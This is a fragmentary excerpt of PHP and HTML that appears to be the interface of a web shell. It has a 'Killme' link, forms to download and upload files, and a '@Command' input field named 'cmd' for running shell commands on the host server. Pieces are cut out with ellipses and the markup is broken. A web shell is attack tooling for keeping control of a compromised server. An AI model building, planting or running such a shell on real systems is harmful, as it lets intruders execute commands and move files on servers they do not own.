...
<tr><td><li style="color: #000;"><a href="?" style="color: lime;"> Home </a></li><br></tr></td>
<tr><td><li style="color: #000;"><a style="color: lime;" href="?star=killme"> Killme </a></li></tr></td>
...
echo '
<tr><td><form action="" method="post"></center>
    <fontst>Downloading File </fontst><input type="text" name="setar" placeholder="example.php">&nbsp;&nbsp;<input type="submit" value="Download" name="download">
    </form></td></tr>
<tr><td><form enctype="multipart/form-data" method="POST"><font color="blue">
Upload File<input type="file" name="file" />
<input type="submit" value="Upload" />
</form></td></tr>
<form method="post" style="margin-top: 15px;">
			  <tr><td>@Command ~ $&nbsp;&nbsp;<input style="border: 1px solid lime;" type="text" name="cmd" bgcolor="lime">
...
$fit = $_POST['setar'];
    if($_POST['download']){
   die("<fontst style='color: red;'>You Cann't Download This file</fontst>");
